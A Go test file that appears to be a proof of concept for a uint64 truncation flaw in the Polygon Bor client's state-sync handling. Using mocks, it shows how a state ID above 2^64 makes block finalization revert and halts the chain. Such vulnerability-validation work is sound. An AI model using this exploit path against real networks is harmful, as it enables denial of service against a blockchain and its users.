package bor

import (
    "fmt"
    "math/big"
    "testing"
    "time"

    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/consensus/bor/clerk"
    "github.com/ethereum/go-ethereum/consensus/bor/statefull"
    "github.com/ethereum/go-ethereum/consensus/bor/valset"
    "github.com/ethereum/go-ethereum/core"
    "github.com/ethereum/go-ethereum/core/state"
    "github.com/ethereum/go-ethereum/core/types"
    "github.com/ethereum/go-ethereum/core/vm"
    "github.com/stretchr/testify/require"

    borTypes "github.com/0xPolygon/heimdall-v2/x/bor/types"
    stakeTypes "github.com/0xPolygon/heimdall-v2/x/stake/types"
)

// dynamicGenesisContract simulates the real StateReceiver contract enforcement logic.
// It strictly enforces sequential state IDs: require(stateId == lastStateId + 1)
type dynamicGenesisContract struct {
    lastStateID *big.Int
}

func (m *dynamicGenesisContract) CommitState(event *clerk.EventRecordWithTime, state vm.StateDB, header *types.Header, chCtx statefull.ChainContext, vmCfg vm.Config) (uint64, error) {
    expectedID := new(big.Int).Add(m.lastStateID, big.NewInt(1))
    eventID := big.NewInt(int64(event.ID)) // Contract compares uint256 vs uint256

    // Simulates: require(stateId == lastStateId + 1, "StateReceiver: invalid state id")
    if eventID.Cmp(expectedID) != 0 {
        return 0, fmt.Errorf("execution reverted: StateReceiver: invalid state id, expected %s got %d", expectedID.String(), event.ID)
    }
    
    // If successful, update internal state
    m.lastStateID = eventID 
    return 100, nil
}

func (m *dynamicGenesisContract) LastStateId(st *state.StateDB, number uint64, hash common.Hash) (*big.Int, error) {
    return m.lastStateID, nil
}

// TestPoC_CommitStates_Uint64Overflow_DoS validates the integer truncation vulnerability.
// It demonstrates that once lastStateId crosses 2^64, the Bor client truncates the ID,
// fetches historical events, and permanently halts the chain due to EVM reverts.
func TestPoC_CommitStates_Uint64Overflow_DoS(t *testing.T) {
    t.Parallel()

    addr1 := common.HexToAddress("0x1")
    sp := &fakeSpanner{vals: []*valset.Validator{{Address: addr1, VotingPower: 1}}}
    borCfg := indoreBorConfig()
    chain, b := newChainAndBorForTest(t, sp, borCfg, true, addr1, uint64(time.Now().Unix())-200)

    genesis := chain.HeaderChain().GetHeaderByNumber(0)
    require.NotNil(t, genesis)

    eventTime := time.Now().Add(-60 * time.Second)
    
    // A historical event that was already processed when lastStateId was small
    historicalEvent := &clerk.EventRecordWithTime{
        EventRecord: clerk.EventRecord{
            ID:       6, // The ID we will replay due to truncation
            ChainID:  "1",
            Contract: common.HexToAddress("0x1001"),
            Data:     []byte{0x01},
        },
        Time: eventTime,
    }

    // --- BEFORE EXPLOIT ---
    t.Run("BEFORE_EXPLOIT_Normal_Operation", func(t *testing.T) {
        // Contract state: lastStateId = 5
        normalGC := &dynamicGenesisContract{lastStateID: big.NewInt(5)}
        b.GenesisContractsClient = normalGC

        b.SetHeimdallClient(&mockHeimdallClient{
            span: &borTypes.Span{
                Id: 0, StartBlock: 0, EndBlock: 255, BorChainId: "1",
                ValidatorSet: stakeTypes.ValidatorSet{
                    Validators: []*stakeTypes.Validator{{ValId: 1, Signer: addr1.Hex(), VotingPower: 1}},
                },
                SelectedProducers: []stakeTypes.Validator{{ValId: 1, Signer: addr1.Hex(), VotingPower: 1}},
            },
            events: []*clerk.EventRecordWithTime{historicalEvent},
        })

        statedb := newStateDBForTest(t, genesis.Root) // FIXED: Removed ()
        h := &types.Header{Number: big.NewInt(16), ParentHash: genesis.Hash(), Time: uint64(time.Now().Unix())}

        // Execute Finalize
        receipts, err := b.Finalize(chain.HeaderChain(), h, statedb, &types.Body{}, []*types.Receipt{})

        // ASSERTION: Succeeds because 5 + 1 == 6. Chain progresses normally.
        require.NoError(t, err, "Before exploit: Finalize should succeed")
        require.NotNil(t, receipts, "Before exploit: Receipts should not be nil")
    })

    // --- AFTER EXPLOIT ---
    t.Run("AFTER_EXPLOIT_Overflow_DoS", func(t *testing.T) {
        // Contract state: lastStateId = 2^64 + 5
        // This simulates the natural or malicious accumulation crossing the uint64 boundary
        overflowValue := new(big.Int).Add(big.NewInt(5), new(big.Int).Lsh(big.NewInt(1), 64))
        overflowGC := &dynamicGenesisContract{lastStateID: overflowValue}
        b.GenesisContractsClient = overflowGC

        // Reset caches to ensure clean execution for this test phase
        b.PurgeCache()

        b.SetHeimdallClient(&mockHeimdallClient{
            span: &borTypes.Span{
                Id: 0, StartBlock: 0, EndBlock: 255, BorChainId: "1",
                ValidatorSet: stakeTypes.ValidatorSet{
                    Validators: []*stakeTypes.Validator{{ValId: 1, Signer: addr1.Hex(), VotingPower: 1}},
                },
                SelectedProducers: []stakeTypes.Validator{{ValId: 1, Signer: addr1.Hex(), VotingPower: 1}},
            },
            // Heimdall returns historical events starting from ID 6 
            // because the Bor client requested fromID = (2^64 + 5 truncated to 5) + 1 = 6
            events: []*clerk.EventRecordWithTime{historicalEvent}, 
        })

        statedb := newStateDBForTest(t, genesis.Root) // FIXED: Removed ()
        h := &types.Header{Number: big.NewInt(16), ParentHash: genesis.Hash(), Time: uint64(time.Now().Unix())}

        // Execute Finalize
        receipts, err := b.Finalize(chain.HeaderChain(), h, statedb, &types.Body{}, []*types.Receipt{})

        // ASSERTION: Fails because 2^64 + 5 + 1 != 6. 
        // The contract reverts, causing block finalization to fail permanently.
        require.Error(t, err, "After exploit: Finalize MUST fail (Chain Halt)")
        require.ErrorIs(t, err, core.ErrStateSyncProcessing, "Error must be ErrStateSyncProcessing")
        require.Nil(t, receipts, "After exploit: Receipts must be nil")
        require.Contains(t, err.Error(), "invalid state id", "Error must originate from contract revert")
    })
}
